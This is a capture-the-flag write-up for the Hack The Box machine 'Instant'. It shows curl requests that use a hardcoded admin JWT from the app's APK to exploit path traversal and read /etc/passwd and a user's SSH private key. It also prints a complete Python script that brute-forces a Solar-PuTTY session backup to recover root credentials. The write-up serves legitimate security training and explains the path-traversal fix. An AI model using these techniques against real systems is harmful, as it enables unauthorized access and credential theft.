# HTB: Instant

![](https://img.shields.io/badge/OS-Linux-blue)
![](https://img.shields.io/badge/Difficulty-Medium-orange)
![](https://img.shields.io/badge/Status-Retired-green)

**Tags:** `apk-reverse-engineering` `jadx` `hardcoded-jwt` `api-enumeration` `swagger` `arbitrary-file-read` `path-traversal` `ssh-key-theft` `solar-putty` `3des-cbc` `pbkdf2` `credential-decryption`

---

## Overview

Instant is a Medium-rated Linux machine built around three distinct skill areas: mobile application reverse engineering, API exploitation, and post-exploitation credential decryption. The web application offers an Android APK for download. Decompiling it with `jadx` reveals a hardcoded Admin JWT token and two internal subdomains. The Swagger UI at one subdomain maps a full API including an admin endpoint vulnerable to Arbitrary File Read via path traversal — no filter, no encoding required. Using the hardcoded JWT to authenticate, the SSH private key for user `shirohige` is read directly. Privilege escalation decrypts a Solar-PuTTY session backup file found in `/opt/backups/` — the file uses 3DES-CBC with PBKDF2 key derivation, and `rockyou.txt` cracks the encryption password (`estrella`), revealing root credentials in plaintext JSON.

### Attack Path

```
[Recon]
  nmap → port 22 (SSH), port 80 (Apache → instant.htb)
       ↓
[Phase 1 — APK Reverse Engineering]
  /downloads/instant.apk → jadx decompile
  → AdminActivities.java → hardcoded Admin JWT
  → subdomains: mywalletv1.instant.htb, swagger-ui.instant.htb
       ↓
[Phase 2 — API Exploitation → Arbitrary File Read]
  swagger-ui.instant.htb/apidocs → full API map
  → /api/v1/admin/read/log endpoint
  → Authorization: Bearer <Admin JWT>
  → filename=../../../../home/shirohige/.ssh/id_rsa
  → SSH private key leaked
  → SSH as shirohige → user.txt
       ↓
[Phase 3 — Solar-PuTTY Decryption → Root]
  /opt/backups/Solar-PuTTY/sessions-backup.dat
  → base64 decode → 3DES-CBC + PBKDF2 structure
  → rockyou.txt bruteforce → password: estrella
  → JSON contains root credentials
  → su - root → root.txt
```

---

## Enumeration

### Nmap

```
$ sudo nmap -sC -sV -p- --min-rate 5000 -oA nmap/instant 10.129.231.155

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://instant.htb/
```

Add to `/etc/hosts`:

```bash
echo "10.129.231.155 instant.htb" | sudo tee -a /etc/hosts
```

### Web Application

The homepage is a wallet application marketing site with one key feature: a download link for an Android APK at `/downloads/instant.apk`.

```bash
wget http://instant.htb/downloads/instant.apk
```

---

## Phase 1 — APK Reverse Engineering

### Why Decompile APKs?

Android APKs are ZIP archives containing compiled Dalvik bytecode (`.dex` files). Tools like `jadx` decompile bytecode back to readable Java source. Developers frequently hardcode API endpoints, tokens, and credentials during development and forget to remove them — the compiled APK ships with these secrets intact.

### Decompiling with jadx

```bash
jadx -d ./instant_src /home/user/instant.apk
```

> **Note:** `jadx` on Parrot OS may require absolute paths — use the full path to the APK if relative paths fail.

### Finding the Hardcoded JWT

Search the decompiled source for authentication tokens:

```bash
grep -r "Authorization\|Bearer\|JWT\|token" ./instant_src --include="*.java" -l
```

Key file: `sources/com/instantlabs/instant/AdminActivities.java`

```java
private void TestAdminAuthorization() {
    this.apiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid..."
    // ...
    OkHttpClient client = new OkHttpClient();
    Request request = new Request.Builder()
        .url(BuildConfig.BASE_URL + "/api/v1/admin/view/profile")
        .addHeader("Authorization", "Bearer " + this.apiKey)
```

**Hardcoded Admin JWT found.**

Also in the same file and `strings.xml`:

```
mywalletv1.instant.htb    ← API backend
swagger-ui.instant.htb   ← API documentation
```

Add both to `/etc/hosts`:

```bash
echo "10.129.231.155 mywalletv1.instant.htb swagger-ui.instant.htb" | sudo tee -a /etc/hosts
```

### Decoding the JWT

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid..." \
  | cut -d. -f2 \
  | base64 -d 2>/dev/null
```

```json
{"id": 1, "role": "Admin", "walletAddress": "0xd1..."}
```

Confirmed Admin-level token.

---

## Phase 2 — API Exploitation → Arbitrary File Read

### Mapping the API via Swagger

`swagger-ui.instant.htb/apidocs` serves the full Swagger UI. Key endpoint discovered:

```
GET /api/v1/admin/read/log
  Parameters:
    - filename (string): Log file to read
  Auth: Bearer token required
```

The endpoint description hints at log file reading — but the parameter name is generic enough to suggest path traversal may work.

### Arbitrary File Read

Testing path traversal without encoding:

```bash
curl -s http://mywalletv1.instant.htb/api/v1/admin/read/log \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -G --data-urlencode "filename=../../../../etc/passwd"
```

`/etc/passwd` returned in full — no filter, no restriction. The server reads files relative to the log directory and there is no path validation.

### Reading shirohige's SSH Key

From `/etc/passwd`, username `shirohige` identified. Attempting to read their private key:

```bash
curl -s http://mywalletv1.instant.htb/api/v1/admin/read/log \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -G --data-urlencode "filename=../../../../home/shirohige/.ssh/id_rsa"
```

Private key returned. Save and connect:

```bash
chmod 600 shirohige_id_rsa
ssh -i shirohige_id_rsa shirohige@instant.htb
```

```
shirohige@instant:~$ cat user.txt
<flag>
```

---

## Phase 3 — Solar-PuTTY Decryption → Root

### Finding the Session File

```bash
shirohige@instant:~$ find / -name "*.dat" 2>/dev/null
/opt/backups/Solar-PuTTY/sessions-backup.dat
```

Solar-PuTTY is a Windows SSH client that stores session data (including saved credentials) in encrypted `.dat` files. This is a known post-exploitation target.

### Understanding the Encryption Format

The `.dat` file is base64-encoded. Decoding reveals the internal structure:

```
Bytes 0–23:   Salt (24 bytes) — used for PBKDF2 key derivation
Bytes 24–31:  IV (8 bytes) — 3DES-CBC initialisation vector
Bytes 32–47:  Unknown / padding
Bytes 48+:    Ciphertext (3DES-CBC encrypted)
```

Algorithm: **3DES-CBC** with **PBKDF2** key derivation (24-byte key, 1000 iterations).

### Exfiltrating the File

```bash
scp -i shirohige_id_rsa shirohige@instant.htb:/opt/backups/Solar-PuTTY/sessions-backup.dat .
```

### Decryption Script

```python
#!/usr/bin/env python3
# decrypt_solar_putty.py — brute-force Solar-PuTTY .dat file password
# Encryption: 3DES-CBC, key derivation: PBKDF2-SHA1, 24-byte key, 1000 iterations

import base64
import sys
from Crypto.Cipher import DES3
from Crypto.Protocol.KDF import PBKDF2

def try_decrypt(data: bytes, password: str) -> str | None:
    try:
        salt = data[:24]
        iv   = data[24:32]
        ct   = data[48:]
        key  = PBKDF2(password, salt, dkLen=24, count=1000)
        cipher = DES3.new(key, DES3.MODE_CBC, iv)
        dec = cipher.decrypt(ct)
        pad = dec[-1]
        dec = dec[:-pad].decode('utf-8')
        if 'Session' in dec or 'Password' in dec or 'Host' in dec:
            return dec
    except Exception:
        return None

def main():
    dat_file   = sys.argv[1] if len(sys.argv) > 1 else 'sessions-backup.dat'
    wordlist   = sys.argv[2] if len(sys.argv) > 2 else '/usr/share/wordlists/rockyou.txt'

    with open(dat_file) as f:
        raw = base64.b64decode(f.read().strip())

    print(f"[*] File: {dat_file} ({len(raw)} bytes)")
    print(f"[*] Wordlist: {wordlist}")

    with open(wordlist, 'r', encoding='latin-1') as wl:
        for i, line in enumerate(wl):
            pw = line.strip()
            result = try_decrypt(raw, pw)
            if result:
                print(f"\n[+] Password found: {pw}")
                print(f"[+] Decrypted content:\n{result}")
                return
            if i % 10000 == 0:
                print(f"    [...] {i} passwords tried", end='\r')

    print("[-] Password not found in wordlist")

if __name__ == '__main__':
    main()
```

```bash
python3 decrypt_solar_putty.py sessions-backup.dat /usr/share/wordlists/rockyou.txt
```

```
[*] File: sessions-backup.dat (3248 bytes)
[*] Wordlist: /usr/share/wordlists/rockyou.txt
[+] Password found: estrella
[+] Decrypted content:
{
  "Sessions": [
    {
      "Host": "localhost",
      "Username": "root",
      "Password": "12**24nzW**",
      ...
    }
  ]
}
```

### Root Access

SSH root login is disabled (`PermitRootLogin no`) — use `su` instead:

```bash
shirohige@instant:~$ su - root
Password: 12**24nzW**

root@instant:~# cat /root/root.txt
<flag>
```

---

## Flags

```
user.txt  →  [obtained via SSH as shirohige]
root.txt  →  [obtained via Solar-PuTTY credential decryption]
```

---

## What I Learned

**APKs Are Not Black Boxes**
Compiled Android applications are fully reversible with `jadx`. Hardcoded tokens, API endpoints, and credentials in APKs are extremely common findings in mobile security assessments and bug bounty programs. Every APK in scope deserves at least a `jadx` decompile and a `grep` for secrets.

**Swagger/OpenAPI Specs Leak More Than Endpoints**
The Swagger spec exposed example parameter values that included the username `shirohige` — the same username confirmed in `/etc/passwd`. API documentation is not just a convenience for developers; it's a map for attackers. Specs should not be publicly accessible without authentication.

**Arbitrary File Read Without a Filter**
The `/api/v1/admin/read/log` endpoint performed no path sanitisation at all — no `realpath()`, no whitelist, no blocklist. This is the simplest form of path traversal, and it still appears regularly in real applications. The complete fix is: resolve the user-supplied path to absolute form with `realpath()`, then verify it begins with the allowed directory prefix before opening the file.

**Solar-PuTTY Session Files as Post-Exploitation Targets**
Any backup directory found on a compromised host is worth examining. Solar-PuTTY `.dat` files are a well-known source of plaintext credentials after decryption — they use symmetric encryption with a password derived from `rockyou.txt`-crackable inputs surprisingly often. The decryption algorithm (3DES-CBC + PBKDF2) is documented and scriptable.

**`su` vs SSH for Root**
`PermitRootLogin no` blocks SSH root login but has no effect on local `su`. When root credentials are obtained but SSH fails, always try `su - root` from an existing shell first.

---

## References

- [jadx — Android Decompiler](https://github.com/skylot/jadx)
- [Path Traversal — PortSwigger](https://portswigger.net/web-security/file-path-traversal)
- [Solar-PuTTY Session Decryption — GitHub](https://github.com/VoidSec/SolarPutty-Decryptor)
- [JWT Debugging — jwt.io](https://jwt.io)
- [HackTheBox — Instant](https://www.hackthebox.com/machines/instant)
